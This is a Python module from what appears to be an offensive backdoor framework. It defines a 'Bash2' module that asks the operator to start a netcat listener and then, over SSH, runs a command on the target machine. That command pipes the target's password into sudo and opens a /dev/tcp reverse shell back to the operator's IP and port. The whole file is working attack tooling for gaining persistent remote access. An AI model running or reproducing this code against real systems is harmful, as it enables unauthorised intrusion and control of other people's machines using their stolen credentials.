from backdoor import *

class Bash2(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using second Bash module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }

    def check_valid(self):
        return True

    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")

        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
        print(GOOD + "Initializing backdoor...")
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % port) 

